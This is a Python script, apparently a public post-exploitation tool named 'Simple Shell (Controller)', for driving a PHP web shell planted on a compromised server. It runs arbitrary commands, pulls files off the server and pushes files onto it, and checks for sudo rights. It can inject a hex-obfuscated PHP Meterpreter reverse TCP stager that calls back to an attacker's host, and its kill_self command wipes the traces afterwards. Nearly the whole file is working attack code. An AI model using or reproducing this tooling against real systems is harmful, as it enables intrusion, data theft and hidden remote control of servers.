#!/usr/bin/env python

### TODO :: Add proxy support

import os, sys, getopt, urllib, urllib2, re, socket, binascii, hashlib, math

_gs = {
	"url": "",
	"chunk_size": 64,					## The heigher, the better upload/download speed, but too heigh can make the requests to big.
	"initial_path": "",
	"shell_path": "",
	"working_directory": "",
	
	"payload_meterpreter": "_m.php",
}


help_notes = """
  Simple Shell (Controller) 0.1
  -----------------------------
  Created by: z0noxz
  https://github.com/z0noxz/smplshllctrlr

  Usage: (python) simple-shell-controller.py [options]

  Options:
    --help                Show this help message and exit
    --url                 Shell interface URL without paramters (e.g. "http://www.site.com/simple-shell.php")
    
    Shell commands:
      Commands that are executable while in shell interface
      
      meterpreter         Injects a PHP Meterpreter, PHP Reverse TCP Stager (requires a listener for php/meterpreter/reverse_tcp)
      upload              Upload a file
      download            Download a file
      kill_self           Cleans up traces and aborts the shell
      exit                Exits the shell
"""

def execute_command(cmd, verbose = True):
	global _gs
	
	output = urllib2.urlopen(_gs["url"] + ("?cmd=" + urllib.quote_plus(cmd) if not cmd == None else "")).read()
	if (verbose): print output
	return output
		
def split(str, num):
    return [ str[start:start+num] for start in range(0, len(str), num) ]

def check_working_directory(working_directory, new_directory):
	
	new_directory = new_directory if not new_directory == "" else working_directory
	
	if (re.match("^(/[^/ ]*)+/?$", new_directory)):
		if (execute_command("if test -d " + new_directory + "; then \"1\"; fi", False) == ""):
			return new_directory
	
	return working_directory

def inject_meterpreter_shell():
	global _gs
	
	print("")
	print("  PHP Meterpreter Injection:")
	print("  ------------------------------------------------------------------")
	print("  This program injects a PHP Meterpreter Reverse TCP Stager to the")
	print("  target server. \033[93mRemember to initialize a reverse TCP handler before")
	print("  executing this program.\033[0m The listener payload should be:")
	print("")
	print("  \033[94mphp/meterpreter/reverse_tcp\033[0m")
	print("")
		
	lhost = "".join("{:02x}".format(ord(c)) for c in raw_input("  LHOST: "))
	lport = "".join("{:02x}".format(ord(c)) for c in raw_input("  LPORT: "))
	
	sys.stdout.write("\n  Initializing..................................................")
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
	
	## Define payload
	sys.stdout.write("  Preparing payload.............................................")
	sys.stdout.flush()
	shell = { ## TODO :: Extend function to include meterpreter injections of types: ASP, JSP etc.
        "php": "3c3f706870206572726f725f7265706f7274696e672830293b20246970203d2022{0}223b2024706f7274203d20{1}3b2069662028282466203d202273747265616d5f736f636b65745f636c69656e7422292026262069735f63616c6c61626c652824662929207b202473203d20246628227463703a2f2f7b2469707d3a7b24706f72747d22293b2024735f74797065203d202273747265616d223b207d20656c736569662028282466203d202266736f636b6f70656e22292026262069735f63616c6c61626c652824662929207b202473203d202466282469702c2024706f7274293b2024735f74797065203d202273747265616d223b207d20656c736569662028282466203d2022736f636b65745f63726561746522292026262069735f63616c6c61626c652824662929207b202473203d2024662841465f494e45542c20534f434b5f53545245414d2c20534f4c5f544350293b2024726573203d2040736f636b65745f636f6e6e6563742824732c202469702c2024706f7274293b2069662028212472657329207b2064696528293b207d2024735f74797065203d2022736f636b6574223b207d20656c7365207b2064696528226e6f20736f636b65742066756e637322293b207d206966202821247329207b2064696528226e6f20736f636b657422293b207d20737769746368202824735f7479706529207b2063617365202273747265616d223a20246c656e203d2066726561642824732c2034293b20627265616b3b20636173652022736f636b6574223a20246c656e203d20736f636b65745f726561642824732c2034293b20627265616b3b207d206966202821246c656e29207b2064696528293b207d202461203d20756e7061636b28224e6c656e222c20246c656e293b20246c656e203d2024615b226c656e225d3b202462203d2022223b207768696c6520287374726c656e28246229203c20246c656e29207b20737769746368202824735f7479706529207b2063617365202273747265616d223a202462202e3d2066726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b20636173652022736f636b6574223a202462202e3d20736f636b65745f726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b207d207d2024474c4f42414c535b226d7367736f636b225d203d2024733b2024474c4f42414c535b226d7367736f636b5f74797065225d203d2024735f747970653b206576616c282462293b2064696528293b3f3e220a".format(lhost, lport),
    }["php"]
	print("[\033[92mOK\033[0m]")
	
	## Remove payload if it allready exists
	sys.stdout.write("  Removing previous payload, if one exists......................")
	sys.stdout.flush()
	execute_command("rm " + _gs["payload_meterpreter"], False)
	print("[\033[92mOK\033[0m]")
		
	## Allocate filename
	sys.stdout.write("  Allocating filename...........................................")
	sys.stdout.flush()
	execute_command("touch " + _gs["payload_meterpreter"], False)
	print("[\033[92mOK\033[0m]")

	## Upload meterpreter payload	
	counter = 1
	step = 1
	chunk_size = _gs["chunk_size"]
	progress_width = 64 - 8
	file_size = len(shell) / 2
	chunk_count = math.ceil(file_size / chunk_size)

	## Setup progress bar
	sys.stdout.write("  Uploading")
	sys.stdout.flush()
	
	while True:
		chunk = shell[(chunk_size * 2 * (counter - 1)):][:chunk_size * 2]

		if chunk:
			chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])

			execute_command("echo -n -e '" + chunk + "' >> " + _gs["payload_meterpreter"], False)

			if ((counter / (chunk_count / progress_width)) > step):
				sys.stdout.write(".")
				sys.stdout.flush()
				step += 1
			counter += 1
		else:
			break

	sys.stdout.write("\b" * (step))
	sys.stdout.flush()
	sys.stdout.write(("." * (progress_width - 2)))
	print("[\033[92mOK\033[0m]")

	## Execute meterpreter shell
	sys.stdout.write("  Executing shell...............................................")
	sys.stdout.flush()
	
	try:
		err = re.sub("<[^>]*>", "", urllib2.urlopen(_gs["url"][:_gs["url"].rfind("/")] + "/" + _gs["payload_meterpreter"], "", 1).read()).strip()
		if not err == "": print(".[\033[91mX\033[0m]\n\n  \033[91mError: " + err + "\033[0m")
			
	## If the urlopen times out, it means (or could mean) that the payload is executed
	except urllib2.URLError, e:
		if isinstance(e.reason, socket.timeout):
			print("[\033[92mOK\033[0m]")
	except socket.timeout, e:
		print("[\033[92mOK\033[0m]")
		
def file_upload():
	global _gs
		
	print("")
	print("  File Uploader:")
	print("  ------------------------------------------------------------------")
	print("  This program simply uploads a file to the target server")
	print("")
	
	lpath = raw_input("  Local path: ")
	file_name = lpath[lpath.rfind("/") + 1:]
	
	sys.stdout.write("\n  Initializing..................................................")
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
	
	try:
		with open(lpath, "rb") as f:

			counter = 1
			step = 1
			chunk_size = _gs["chunk_size"]
			progress_width = 64 - 8
			file_size = os.path.getsize(lpath)
			chunk_count = math.ceil(file_size / chunk_size)
			local_hash_md5 = hashlib.md5()

			## Setup progress bar
			sys.stdout.write("  Uploading")
			sys.stdout.flush()

			execute_command("cd " + _gs["working_directory"] + " && rm " + file_name, False)
			execute_command("cd " + _gs["working_directory"] + " && touch " + file_name, False)

			while True:
				chunk = f.read(chunk_size)
				local_hash_md5.update(chunk)

				if chunk:				
					chunk = binascii.hexlify(chunk)
					chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])

					execute_command("cd " + _gs["working_directory"] + " && echo -n -e '" + chunk + "' >> " + file_name, False)

					if ((counter / (chunk_count / progress_width)) > step):
						sys.stdout.write(".")
						sys.stdout.flush()
						step += 1
					counter += 1
				else:
					break

			sys.stdout.write("\b" * (step))
			sys.stdout.flush()
			sys.stdout.write(("." * (progress_width - 2)))
			print("[\033[92mOK\033[0m]")
			
			sys.stdout.write("  Analysing file integrity......................................")
			sys.stdout.flush()
			print("[\033[92mOK\033[0m]" if (str(execute_command("cd " + _gs["working_directory"] + " && md5sum " + file_name + " | awk '{ print $1 }'", False)).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
	except:
		print("\n  \033[91mError: cannot open '" + file_name + "'\033[0m")

def file_download():
	global _gs

	print("")
	print("  File Downloader:")
	print("  ------------------------------------------------------------------")
	print("  This program simply downloads a file from the target server")
	print("")
	
	rpath = raw_input("  Remote path: ")
	file_name = rpath[rpath.rfind("/") + 1:]	
	
	sys.stdout.write("\n  Initializing..................................................")
	sys.stdout.flush()
	print("[\033[92mOK\033[0m]")
		
	try:
		counter = 1
		step = 1
		chunk_size = _gs["chunk_size"]
		progress_width = 64 - 10
		file_size = int(execute_command("cd " + _gs["working_directory"] + " && stat -c%s " + rpath, False))
		chunk_count = math.ceil(file_size / chunk_size)
		local_hash_md5 = hashlib.md5()

		## Setup progress bar
		sys.stdout.write("  Downloading")
		sys.stdout.flush()
		
		try: os.remove(file_name)
		except OSError: pass
		
		while True:
			chunk = execute_command("cd " + _gs["working_directory"] + " && hexdump -ve '1/1 \"%.2x\"' " + rpath + " -n " + str(chunk_size) + " -s " + str(chunk_size * (counter - 1)), False)		

			if (not chunk == ""): 
				with open(file_name, "ab") as f:
					f.write(binascii.unhexlify(chunk))
				
				if ((counter / (chunk_count / progress_width)) > step):
					sys.stdout.write(".")
					sys.stdout.flush()
					step += 1
				counter += 1
			else:
				break

		sys.stdout.write("\b" * (step - 1))
		sys.stdout.flush()
		sys.stdout.write(("." * (progress_width - 3)))
		print("[\033[92mOK\033[0m]")
		
		sys.stdout.write("  Analysing file integrity......................................")
		sys.stdout.flush()	

		local_hash_md5 = hashlib.md5()
		with open(file_name, "rb") as f:
			local_hash_md5.update(f.read())
		
		print("[\033[92mOK\033[0m]" if (str(execute_command("cd " + _gs["working_directory"] + " && md5sum " + rpath + " | awk '{ print $1 }'", False)).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
	
	except:
		print("\n  \033[91mError: cannot download file'" + file_name + "'\033[0m")

def kill_self():
	global _gs
	
	print("")
	print("  Kill Self Protocol:")
	print("  ------------------------------------------------------------------")
	print("  This program cleans up traces and aborts the shell")
	print("")
	
	## Remove payloads
	sys.stdout.write("  Removing payloads.............................................")
	execute_command("rm " + _gs["initial_path"] + "/met.php", False)
	print("[\033[92mOK\033[0m]")
	
	## Remove self
	sys.stdout.write("  Removing initial shell........................................")
	execute_command("rm " + _gs["shell_path"], False)
	print("[\033[92mOK\033[0m]")
	
	## Shutting down
	print("  Shutting down...")
	sys.exit()
	
def main(argv):
	global _gs, help_notes
	
	try:
		opts, args = getopt.getopt(argv, "",
		[
			"help",
			"url=",
		])
	except getopt.GetoptError, err:
		print help_notes
		print err
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("--help"):
			print help_notes
			sys.exit()
		elif opt in ("--url"): _gs["url"] = arg

	if (not _gs["url"] == ""):
		
		try:
			urllib2.urlopen(_gs["url"]).read()
		except urllib2.URLError, e:
			print "\n  \033[91mCannot access the interface\033[0m"
			sys.exit(2)
			
		
		_gs["working_directory"] = execute_command("pwd", False).strip()
		_gs["initial_path"] = _gs["working_directory"]
		_gs["shell_path"] = _gs["initial_path"] + _gs["url"][_gs["url"].rfind("/"):]
		
		def _command(x = None):			
			cmds = {
				"meterpreter": inject_meterpreter_shell,
				"upload": file_upload,
				"download": file_download,
				"kill_self": kill_self,
				"exit": sys.exit,
			}
			
			if (not x == None):
				fnc = cmds.get(x, None)				
				if (not fnc == None): 
					fnc()
					return True
				else:
					return False
			else:
				return sorted(cmds.keys(), key = lambda k: cmds[k])
		
		print ""
		print "  SHELL    : " + _gs["shell_path"]
		print "  ID       : " + execute_command("id", False).strip()
		print "  SUDO     : " + ("\033[92mAccess granted\033[0m" if execute_command("timeout 2 sudo id && echo 1 || echo 0", False) == "1" else "\033[91mAccess denied\033[0m")
		print ""
		print "  COMMANDS : " + "\n             ".join(_command())
		print ""
		
		while (True):
			user_input = raw_input("ssc [\033[94m" + _gs["working_directory"] + "\033[0m] > ")
			
			if (not _command(user_input)):
				output = execute_command("cd " + _gs["working_directory"] + " && " + user_input + " && pwd", False).strip().split("\n")
				_gs["working_directory"] = check_working_directory(_gs["working_directory"], output[len(output) - 1])

				print "  " + "\n  ".join(output[:len(output) - 1])
			else:
				print ""
			
if __name__ == "__main__": main(sys.argv[1:])